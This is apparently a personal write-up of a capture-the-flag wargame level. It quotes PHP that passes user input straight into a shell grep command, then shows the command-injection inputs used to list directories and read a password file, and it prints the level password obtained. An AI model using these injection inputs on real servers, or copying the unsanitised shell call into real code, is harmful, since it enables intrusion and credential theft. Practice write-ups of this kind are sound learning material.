ANOTHER view source-code challenge:

upon inspection we find this code:
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}

now correct me if I am wrong but that does look like we are entering some key word directly into grep. 
searching for "dog" gives search hits.
searching for dog; ls gives us the content of the directory where the dictionary is currently held.

; ls .. gives us the content of dir one level up. 
We are at lvl9 looking for the password for lvl 10.
Let's GO! 

After a shit ton of fail. I use the following command
; ls ../../../.. 
Finder etc dir.
	this was the path used last time so her eI will look further now

finally ; cat ../../../../etc/natas_webpass/natas10

yields: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
Trial and error time: SUCCESS!!!

password for next lvl:
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
